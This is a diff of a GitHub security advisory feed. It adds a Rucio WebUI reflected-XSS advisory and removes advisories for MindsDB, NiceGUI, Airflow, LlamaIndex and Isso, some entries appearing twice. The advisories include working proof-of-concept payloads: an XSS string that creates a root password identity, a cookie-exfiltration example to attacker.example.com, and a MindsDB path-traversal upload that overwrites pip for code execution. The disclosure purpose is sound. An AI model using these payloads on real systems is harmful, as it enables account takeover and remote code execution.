+<pre><code class="language-html">&lt;img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()&gt;
+</code></pre>
+<p><strong>Creating identity for Root account via reflected XSS</strong>
+<img src="https://github.com/user-attachments/assets/539bfff4-70f3-42c5-b83a-10b5f85d6d44" alt="Creating identity for Root account via reflected XSS" height="957" width="1558"></p>
+<p>All WebUI users are impacted.</p>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>Change all client-side insertions of server-provided text from <code>.html(...)</code> to <code>.text()</code> or create text nodes / escape HTML before insertion. Example: replace <code>$('#elem').html(msg)</code> with <code>$('#elem').empty().append($('&lt;span&gt;').text(msg))</code>.</p>
+<p>Additionally, consider adding a Content Security Policy (CSP) to mitigate external script execution and set the HTTPOnly flag for session cookies. Also, the API token should not be set in a JavaScript variable as it can be accessed by an attacker even with the HTTPOnly flag set on the session cookie.</p>
+<blockquote>
+<p>Note that many pages were found setting the API token as <code>token</code> in an authenticated response like <code>var token = "root-root-webui-...:"</code> (See <code>/ui/list_accounts</code> for example)</p>
+</blockquote>
+<h4 id="references">References:</h4>
+<ul>
+<li>Server functions: <code>common.py</code> (<code>error_headers</code>, <code>_error_response, generate_http_error_flask</code>)</li>
+<li>Example client files to fix: <code>lib/rucio/web/ui/static/rule.js</code>, <code>lib/rucio/web/ui/static/request_rule.js, list_rules.js</code></li>
+<li>OWASP XSS Prevention Cheat Sheet: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q">https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h79m-5jjm-jm4q">https://github.com/advisories/GHSA-h79m-5jjm-jm4q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h79m-5jjm-jm4q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T18:53:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[rucio-webui] Rucio WebUI has a Reflected Cross-site Scripting Vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-h79m-5jjm-jm4q</id>
+        <link href="https://github.com/advisories/GHSA-h79m-5jjm-jm4q"/>
+        <updated>2026-02-25T18:53:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A reflected Cross-site Scripting vulnerability was located in the rendering of the ExceptionMessage of the WebUI 500 error which could allow attackers to steal login session tokens of users who navigate to a specially crafted URL.</p>
+<h4 id="details">Details</h4>
+<p>The WebUI error message renders <code>ExceptionMessage</code> (which can contain user-controlled input) as unencoded HTML. Server code that produces the message is in <code>common.py</code> - specifically <code>error_headers -&gt; _error_response -&gt; generate_http_error_flask</code>, which places <code>ExceptionMessage</code> into both response headers and the JSON body. The WebUI client then injects that text into the DOM using unsafe methods (examples in <code>lib/rucio/web/ui/static/*.js</code> such as <code>rule.js</code>, <code>request_rule.js</code>, <code>list_rules.js</code>) with <code>jQuery.html(...)</code> or equivalent, enabling reflected XSS when an attacker-controlled value is included in an error message (e.g. account, attribute, scope).</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Reflected XSS via account parameter (browse or load URL in WebUI context):</li>
+</ol>
+<pre><code class="language-text">https://127.0.0.1:8443/ui/account_rse_usage?account=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+</code></pre>
+<p>Server response (excerpt):</p>
+<pre><code class="language-http">HTTP/1.1 500 INTERNAL SERVER ERROR
+ExceptionClass: AccountNotFound
+ExceptionMessage: Account &lt;img src=x onerror=alert(document.cookie)&gt; does not exist
+Content-Type: application/octet-stream
+
+{"ExceptionClass":"AccountNotFound","ExceptionMessage":"Account &lt;img src=x onerror=alert(document.cookie)&gt; does not exist"}
+</code></pre>
+<p><strong>XSS payload triggering (Displaying session token) when browsing to crafted URL</strong>
+<img src="https://github.com/user-attachments/assets/989a0aed-628d-4f1c-bbfb-de434dab8af6" alt="XSS payload triggering (Displaying session token) when browsing to crafted URL" height="510" width="1210"></p>
+<p>When the WebUI inserts <code>ExceptionMessage</code> into the page with <code>.html(...)</code>, the injected <img> executes and displays the users' session tokens. Note that this is a PoC only, an attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e <code>GET https://attacker.example.com/rucio/{BASE64_COOKIE}</code>).</p>
+<ol start="2">
+<li>Reflected XSS via account key attribute creation error:</li>
+</ol>
+<pre><code class="language-http">POST /proxy/accounts/pentest/attr/XSS HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Origin: https://127.0.0.1:8443
+X-Rucio-Script: webui::-ui-account
+{"key":"XSS","value":"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"}
+</code></pre>
+<p><strong>XSS payload triggering (Displaying session token) on error when creating account key</strong>
+<img src="https://github.com/user-attachments/assets/151cb0ad-e4f0-498e-954e-be3455ca8a72" alt="XSS payload triggering (Displaying session token) on error when creating account key" height="593" width="1322"></p>
+<p>Server response (excerpt) contains <code>ExceptionMessage</code> with the raw <code>&lt;script&gt;</code> payload; the WebUI renders it unsafely and script executes. Note that this method is less impactful since it's not something that can be triggered with a URL alone, but is listed to show that this issue affects multiple locations.</p>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated WebUI user who follows a crafted link or triggers a request containing attacker-controlled input in a field that causes an error may execute arbitrary JavaScript in the WebUI origin. This vulnerability is more impactful due to the lack of protection of cookies (The Session token does not have HttpOnly attribute) and lack of Content Security Policy that would prevent thrid-party scripts from loading.</p>
+<p>Attackers can steal session cookies/tokens or perform actions as the victim like creating a new UserPass identity with an attacker known password. </p>
+<p><strong>Example URL to Create UserPass for Root</strong></p>
+<pre><code>https://localhost:8443/ui/account_rse_usage?account=%3Cimg%20src%3Dx%20onerror%3D(function()%7Bo%3D%7B%7D%3Bo.method%3D'PUT'%3Bo.credentials%3D'include'%3Bo.headers%3D%7B'X-Rucio-Username'%3A'attackeruser'%2C'X-Rucio-Password'%3A'AttackerPassword123'%2C'X-Rucio-Email'%3A'demo%40example.org'%2C'X-Rucio-Auth-Token'%3Atoken%7D%3Bfetch(String.fromCharCode(47)%2B'identities'%2BString.fromCharCode(47)%2B'root'%2BString.fromCharCode(47)%2B'userpass'%2Co)%7D)()%3E
+</code></pre>
+<p><strong>Account Payload to Create UserPass</strong></p>
+<pre><code class="language-html">&lt;img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()&gt;
+</code></pre>
+<p><strong>Creating identity for Root account via reflected XSS</strong>
+<img src="https://github.com/user-attachments/assets/539bfff4-70f3-42c5-b83a-10b5f85d6d44" alt="Creating identity for Root account via reflected XSS" height="957" width="1558"></p>
+<p>All WebUI users are impacted.</p>
+<h3 id="remediation--mitigation">Remediation / Mitigation</h3>
+<p>Change all client-side insertions of server-provided text from <code>.html(...)</code> to <code>.text()</code> or create text nodes / escape HTML before insertion. Example: replace <code>$('#elem').html(msg)</code> with <code>$('#elem').empty().append($('&lt;span&gt;').text(msg))</code>.</p>
+<p>Additionally, consider adding a Content Security Policy (CSP) to mitigate external script execution and set the HTTPOnly flag for session cookies. Also, the API token should not be set in a JavaScript variable as it can be accessed by an attacker even with the HTTPOnly flag set on the session cookie.</p>
+<blockquote>
+<p>Note that many pages were found setting the API token as <code>token</code> in an authenticated response like <code>var token = "root-root-webui-...:"</code> (See <code>/ui/list_accounts</code> for example)</p>
+</blockquote>
+<h4 id="references">References:</h4>
+<ul>
+<li>Server functions: <code>common.py</code> (<code>error_headers</code>, <code>_error_response, generate_http_error_flask</code>)</li>
+<li>Example client files to fix: <code>lib/rucio/web/ui/static/rule.js</code>, <code>lib/rucio/web/ui/static/request_rule.js, list_rules.js</code></li>
+<li>OWASP XSS Prevention Cheat Sheet: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q">https://github.com/rucio/rucio/security/advisories/GHSA-h79m-5jjm-jm4q</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/35.8.3">https://github.com/rucio/rucio/releases/tag/35.8.3</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/38.5.4">https://github.com/rucio/rucio/releases/tag/38.5.4</a></li>
+<li><a href="https://github.com/rucio/rucio/releases/tag/39.3.1">https://github.com/rucio/rucio/releases/tag/39.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-h79m-5jjm-jm4q">https://github.com/advisories/GHSA-h79m-5jjm-jm4q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h79m-5jjm-jm4q</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-02-25T18:53:29.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[datapizza-ai-core] datapizza-ai has unsafe deserialization via pickle.loads() in RedisCache]]></title>
         <id>https://github.com/advisories/GHSA-hg58-x52p-859c</id>
@@ -618,1382 +1584,5 @@ with open("poc_obj_multi.pkl", "rb") as f:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-02-24T21:41:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mindsdb] MindsDB: Path Traversal in /api/files Leading to Remote Code Execution]]></title>
-        <id>https://github.com/advisories/GHSA-4894-xqv6-vrfq</id>
-        <link href="https://github.com/advisories/GHSA-4894-xqv6-vrfq"/>
-        <updated>2026-02-24T20:07:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>There is a path traversal vulnerability in Mindsdb's /api/files interface, which an authenticated attacker can exploit to achieve remote command execution.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerability exists in the "Upload File" module, which corresponds to the API endpoint /api/files. The affected code is located at mindsdb/api/http/namespaces/file.py:</p>
-<pre><code class="language-python">@ns_conf.route("/&lt;name&gt;")
-@ns_conf.param("name", "MindsDB's name for file")
-class File(Resource):
-    @ns_conf.doc("put_file")
-    @api_endpoint_metrics('PUT', '/files/file')
-    def put(self, name: str):
-        """add new file
-        params in FormData:
-            - file
-            - original_file_name [optional]
-        """
-
-        data = {}
-        mindsdb_file_name = name
-
-        existing_file_names = ca.file_controller.get_files_names()
-
-        def on_field(field):
-            name = field.field_name.decode()
-            value = field.value.decode()
-            data[name] = value
-
-        file_object = None
-
-        def on_file(file):
-            nonlocal file_object
-            data["file"] = file.file_name.decode()
-            file_object = file.file_object
-
-        temp_dir_path = tempfile.mkdtemp(prefix="mindsdb_file_")
-
-        if request.headers["Content-Type"].startswith("multipart/form-data"):
-            parser = multipart.create_form_parser(
-                headers=request.headers,
-                on_field=on_field,
-                on_file=on_file,
-                config={
-                    "UPLOAD_DIR": temp_dir_path.encode(),  # bytes required
-                    "UPLOAD_KEEP_FILENAME": True,
-                    "UPLOAD_KEEP_EXTENSIONS": True,
-                    "MAX_MEMORY_FILE_SIZE": 0,
-                },
-            )
-
-            while True:
-                chunk = request.stream.read(8192)
-                if not chunk:
-                    break
-                parser.write(chunk)
-            parser.finalize()
-            parser.close()
-
-            if file_object is not None:
-                if not file_object.closed:
-                    try:
-                        file_object.flush()
-                    except (AttributeError, ValueError, OSError):
-                        logger.debug("Failed to flush file_object before closing.", exc_info=True)
-                    file_object.close()
-                file_object = None
-        else:
-            data = request.json
-</code></pre>
-<p>Since the multipart file upload does not perform security checks on the uploaded file path, an attacker can perform path traversal by using ../ sequences in the filename field. The file write operation occurs before calling clear_filename and save_file, meaning there is no filtering of filenames or file types, allowing arbitrary content to be written to any path on the server.</p>
-<h3 id="poc">PoC</h3>
-<p>This vulnerability can be exploited to overwrite existing executable files, which retain their executable permissions after being overwritten. In addition to conventional file upload exploitation methods, we provide a way to achieve Remote Code Execution (RCE) by leveraging MindsDB's own functionality.</p>
-<p>The API endpoint //install is used to install handlers, which internally calls install_dependencies to install dependencies via pip. This function executes pip using subprocess.Popen. Therefore, an attacker can:</p>
-<ol>
-<li>Exploit the vulnerability to overwrite /venv/lib/python3.10/site-packages/pip/<strong>init</strong>.py with a malicious Python script.</li>
-<li>Trigger the execution of the malicious script by calling //install, which invokes pip.</li>
-</ol>
-<p>Exploit：</p>
-<pre><code>PUT /api/files/mm HTTP/1.1
-Host: ip:47334
-Content-Length: 579
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
-Accept: application/json, text/plain, */*
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv9dZC0cAHLlHSHD9
-Origin: http://ip:47334
-Referer: http://ip:47334/fileUpload
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh,en;q=0.9,zh-CN;q=0.8
-Cookie: bid=87948125-5042-4fc8-a692-9cbf71e387be
-Connection: keep-alive
-
-------WebKitFormBoundaryv9dZC0cAHLlHSHD9
-Content-Disposition: form-data; name="name"
-
-mm
-------WebKitFormBoundaryv9dZC0cAHLlHSHD9
-Content-Disposition: form-data; name="source"
-
-mm
-------WebKitFormBoundaryv9dZC0cAHLlHSHD9
-Content-Disposition: form-data; name="source_type"
-
-file
-------WebKitFormBoundaryv9dZC0cAHLlHSHD9
-Content-Disposition: form-data; name="file"; filename="../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py"
-Content-Type: text/plain
-
-import os
-os.system("touch /tmp/rce_by_hacker")
-------WebKitFormBoundaryv9dZC0cAHLlHSHD9--
-</code></pre>
-<p>After sending this request, you can observe the logs in Docker's output:</p>
-<pre><code>2025-05-30 02:26:52,432            http INFO     python_multipart.multipart: Opening a file on disk
-2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Saving with filename in: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0'
-2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Opening file: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0/../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py'
-</code></pre>
-<p>At this point, you can see that the file has been successfully overwritten:</p>
-<pre><code>root@e445c93b2fd5:/mindsdb# cat /venv/lib/python3.10/site-packages/pip/__init__.py
-import os
-os.system("touch /tmp/rce_by_hacker")
-</code></pre>
-<p>Afterwards, install any handler in the UI, and you will see that the file rce_by_hacker is successfully created in the /tmp directory. The same result can also be achieved by sending an API request to trigger it.</p>
-<h3 id="credit">Credit</h3>
-<p>This vulnerability was discovered by:</p>
-<ul>
-<li>XlabAI Team of Tencent Xuanwu Lab</li>
-<li>Atuin Automated Vulnerability Discovery Engine</li>
-</ul>
-<p>If there are any questions regarding the vulnerability details, please feel free to reach out to MindsDB for further discussion at <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4894-xqv6-vrfq">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-4894-xqv6-vrfq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27483">https://nvd.nist.gov/vuln/detail/CVE-2026-27483</a></li>
-<li><a href="https://github.com/mindsdb/mindsdb/commit/87a44bdb2b97f963e18f10a068e1a1e2690505ef">https://github.com/mindsdb/mindsdb/commit/87a44bdb2b97f963e18f10a068e1a1e2690505ef</a></li>
-<li><a href="https://github.com/mindsdb/mindsdb/releases/tag/v25.9.1.1">https://github.com/mindsdb/mindsdb/releases/tag/v25.9.1.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-4894-xqv6-vrfq">https://github.com/advisories/GHSA-4894-xqv6-vrfq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4894-xqv6-vrfq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-24T20:07:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nicegui] NiceGUI vulnerable to XSS via Code Injection during client-side element function execution]]></title>
-        <id>https://github.com/advisories/GHSA-78qv-3mpx-9cqq</id>
-        <link href="https://github.com/advisories/GHSA-78qv-3mpx-9cqq"/>
-        <updated>2026-02-24T19:56:19.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Several NiceGUI APIs that execute methods on client-side elements (<code>Element.run_method()</code>, <code>AgGrid.run_grid_method()</code>, <code>EChart.run_chart_method()</code>, and others) use an <code>eval()</code> fallback in the JavaScript-side <code>runMethod()</code> function. When user-controlled input is passed as the method name, an attacker can inject arbitrary JavaScript that executes in the victim's browser.</p>
-<p>Additionally, <code>Element.run_method()</code> and <code>Element.get_computed_prop()</code> used string interpolation instead of <code>json.dumps()</code> for the method/property name, allowing quote injection to break out of the intended string context.</p>
-<h3 id="attack-vector">Attack Vector</h3>
-<p>An attacker crafts a malicious URL with a payload as a query parameter. If the application passes this parameter as a method name to any of the affected APIs, the payload is sent to the client via WebSocket and executed via <code>eval()</code>.</p>
-<p><strong>Example:</strong> <code>/?method=alert(document.cookie)</code> combined with application code like:</p>
-<pre><code class="language-python">element.run_method(user_provided_method_name)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Cookie/token theft</li>
-<li>DOM manipulation (phishing, fake login forms)</li>
-<li>Actions performed as the victim user</li>
-</ul>
-<h3 id="affected-methods">Affected Methods</h3>
-<ol>
-<li><code>Element.run_method()</code></li>
-<li><code>Element.get_computed_prop()</code></li>
-<li><code>AgGrid.run_grid_method()</code></li>
-<li><code>AgGrid.run_row_method()</code></li>
-<li><code>EChart.run_chart_method()</code></li>
-<li><code>JsonEditor.run_editor_method()</code></li>
-<li><code>Xterm.run_terminal_method()</code></li>
-<li><code>Leaflet.run_map_method()</code></li>
-<li><code>Leaflet.run_layer_method()</code></li>
-<li><code>LeafletLayer.run_method()</code></li>
-</ol>
-<h3 id="fix">Fix</h3>
-<ol>
-<li>Use <code>json.dumps()</code> for proper escaping of method/property names in <code>run_method()</code> and <code>get_computed_prop()</code></li>
-<li>Remove the <code>eval()</code> fallback from <code>runMethod()</code> in <code>nicegui.js</code> — method names that are not found on the element now raise an error instead of being evaluated as arbitrary JavaScript</li>
-</ol>
-<h3 id="migration">Migration</h3>
-<p>Code that previously passed JavaScript functions as method names needs to use <code>ui.run_javascript()</code> instead:</p>
-<pre><code class="language-python"># Before:
-row = await grid.run_grid_method('g =&gt; g.getDisplayedRowAtIndex(0).data')
-
-# After:
-row = await ui.run_javascript(f'return getElement({grid.id}).api.getDisplayedRowAtIndex(0).data')
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zauberzeug/nicegui/security/advisories/GHSA-78qv-3mpx-9cqq">https://github.com/zauberzeug/nicegui/security/advisories/GHSA-78qv-3mpx-9cqq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27156">https://nvd.nist.gov/vuln/detail/CVE-2026-27156</a></li>
-<li><a href="https://github.com/zauberzeug/nicegui/commit/1861f59cc374ca0dc9d970b157ef3774720f8dbf">https://github.com/zauberzeug/nicegui/commit/1861f59cc374ca0dc9d970b157ef3774720f8dbf</a></li>
-<li><a href="https://github.com/advisories/GHSA-78qv-3mpx-9cqq">https://github.com/advisories/GHSA-78qv-3mpx-9cqq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-78qv-3mpx-9cqq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-24T19:56:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[apache-airflow] Apache Airflow proxy credentials for various providers might leak in task logs]]></title>
-        <id>https://github.com/advisories/GHSA-7c2f-r6gc-h92h</id>
-        <link href="https://github.com/advisories/GHSA-7c2f-r6gc-h92h"/>
-        <updated>2026-02-24T16:21:10.000Z</updated>
-        <content type="html"><![CDATA[<p>In Apache Airflow versions before 3.1.6, and 2.11.1 the proxies and proxy fields within a Connection may include proxy URLs containing embedded authentication information. These fields were not treated as sensitive by default and therefore were not automatically masked in log output. As a result, when such connections are rendered or printed to logs, proxy credentials embedded in these fields could be exposed.</p>
-<p>Users are recommended to upgrade to 3.1.6 or later for Airflow 3, and 2.11.1 or later for Airflow 2 which fixes this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-68675">https://nvd.nist.gov/vuln/detail/CVE-2025-68675</a></li>
-<li><a href="https://lists.apache.org/thread/x6kply4nqd4vc4wgxtm6g9r2tt63s8c5">https://lists.apache.org/thread/x6kply4nqd4vc4wgxtm6g9r2tt63s8c5</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/01/15/6">http://www.openwall.com/lists/oss-security/2026/01/15/6</a></li>
-<li><a href="https://github.com/apache/airflow/pull/59688">https://github.com/apache/airflow/pull/59688</a></li>
-<li><a href="https://github.com/advisories/GHSA-7c2f-r6gc-h92h">https://github.com/advisories/GHSA-7c2f-r6gc-h92h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7c2f-r6gc-h92h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-01-16T12:30:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[apache-airflow] Apache Airflow proxy credentials for various providers might leak in task logs]]></title>
-        <id>https://github.com/advisories/GHSA-7c2f-r6gc-h92h</id>
-        <link href="https://github.com/advisories/GHSA-7c2f-r6gc-h92h"/>
-        <updated>2026-02-24T16:21:10.000Z</updated>
-        <content type="html"><![CDATA[<p>In Apache Airflow versions before 3.1.6, and 2.11.1 the proxies and proxy fields within a Connection may include proxy URLs containing embedded authentication information. These fields were not treated as sensitive by default and therefore were not automatically masked in log output. As a result, when such connections are rendered or printed to logs, proxy credentials embedded in these fields could be exposed.</p>
-<p>Users are recommended to upgrade to 3.1.6 or later for Airflow 3, and 2.11.1 or later for Airflow 2 which fixes this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-68675">https://nvd.nist.gov/vuln/detail/CVE-2025-68675</a></li>
-<li><a href="https://lists.apache.org/thread/x6kply4nqd4vc4wgxtm6g9r2tt63s8c5">https://lists.apache.org/thread/x6kply4nqd4vc4wgxtm6g9r2tt63s8c5</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/01/15/6">http://www.openwall.com/lists/oss-security/2026/01/15/6</a></li>
-<li><a href="https://github.com/apache/airflow/pull/59688">https://github.com/apache/airflow/pull/59688</a></li>
-<li><a href="https://github.com/advisories/GHSA-7c2f-r6gc-h92h">https://github.com/advisories/GHSA-7c2f-r6gc-h92h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7c2f-r6gc-h92h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-01-16T12:30:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[llama-index-core] LlamaIndex Improper Handling of Exceptional Conditions vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-j3wr-m6xh-64hg</id>
-        <link href="https://github.com/advisories/GHSA-j3wr-m6xh-64hg"/>
-        <updated>2026-02-24T16:08:09.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability in the LangChainLLM class of the run-llama/llama_index repository, version v0.12.5, allows for a Denial of Service (DoS) attack. The stream_complete method executes the llm using a thread and retrieves the result via the get_response_gen method of the StreamingGeneratorCallbackHandler class. If the thread terminates abnormally before the _llm.predict is executed, there is no exception handling for this case, leading to an infinite loop in the get_response_gen function. This can be triggered by providing an input of an incorrect type, causing the thread to terminate and the process to continue running indefinitely.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12704">https://nvd.nist.gov/vuln/detail/CVE-2024-12704</a></li>
-<li><a href="https://github.com/run-llama/llama_index/commit/d1ecfb77578d089cbe66728f18f635c09aa32a05">https://github.com/run-llama/llama_index/commit/d1ecfb77578d089cbe66728f18f635c09aa32a05</a></li>
-<li><a href="https://huntr.com/bounties/a0b638fd-21c6-4ba7-b381-6ab98472a02a">https://huntr.com/bounties/a0b638fd-21c6-4ba7-b381-6ab98472a02a</a></li>
-<li><a href="https://github.com/advisories/GHSA-j3wr-m6xh-64hg">https://github.com/advisories/GHSA-j3wr-m6xh-64hg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j3wr-m6xh-64hg</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-03-20T12:32:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[isso] Isso affected by Stored XSS via comment website field]]></title>
-        <id>https://github.com/advisories/GHSA-9fww-8cpr-q66r</id>
-        <link href="https://github.com/advisories/GHSA-9fww-8cpr-q66r"/>
-        <updated>2026-02-24T16:03:04.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
-<p>This is a stored Cross-Site Scripting (XSS) vulnerability affecting the website and author comment fields. The website field was HTML-escaped using quote=False, which left single and double quotes unescaped. Since the frontend inserts the website value directly into a single-quoted href attribute via string concatenation, a single quote in the URL breaks out of the attribute context, allowing injection of arbitrary event handlers (e.g. onmouseover, onclick).</p>
-<p>The same escaping was missing entirely from the user-facing comment edit endpoint (PUT /id/) and the moderation edit endpoint (POST /id//edit/).</p>
-<p>Any visitor to a page embedding isso comments is impacted. No authentication or interaction beyond mouse movement is required to trigger a payload — an attacker can post a comment anonymously (moderation is off by default) with a crafted website URL, and the payload persists in the database and fires on every page load. With the full-page invisible overlay technique described in the report, the victim only needs to move their mouse.</p>
-<h2 id="patches">Patches</h2>
-<p>The issue is fixed in commit 3cf27c2. Users should upgrade to a version containing that commit once released. The fix applies html.escape(..., quote=True) to the website field across all three write paths (POST /new, PUT /id/, POST /id//edit/), and adds input validation and escaping to the moderation edit endpoint which previously had neither.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>  Enabling comment moderation (moderation = enabled = true in isso.cfg) prevents unauthenticated users from publishing comments, raising the bar for exploitation. However, it
-  does not fully mitigate the issue since a moderator activating a malicious comment would still expose visitors. There is no configuration-only workaround that fully prevents
-   the vulnerability.</p>
-<h2 id="resources">Resources</h2>
-<ul>
-<li><a href="https://docs.python.org/3/library/html.html#html.escape">https://docs.python.org/3/library/html.html#html.escape</a> — note the quote parameter</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/isso-comments/isso/security/advisories/GHSA-9fww-8cpr-q66r">https://github.com/isso-comments/isso/security/advisories/GHSA-9fww-8cpr-q66r</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27469">https://nvd.nist.gov/vuln/detail/CVE-2026-27469</a></li>
-<li><a href="https://github.com/isso-comments/isso/commit/0afbfe0691ee237963e8fb0b2ee01c9e55ca2144">https://github.com/isso-comments/isso/commit/0afbfe0691ee237963e8fb0b2ee01c9e55ca2144</a></li>
-<li><a href="https://docs.python.org/3/library/html.html#html.escape">https://docs.python.org/3/library/html.html#html.escape</a></li>
-<li><a href="https://github.com/advisories/GHSA-9fww-8cpr-q66r">https://github.com/advisories/GHSA-9fww-8cpr-q66r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
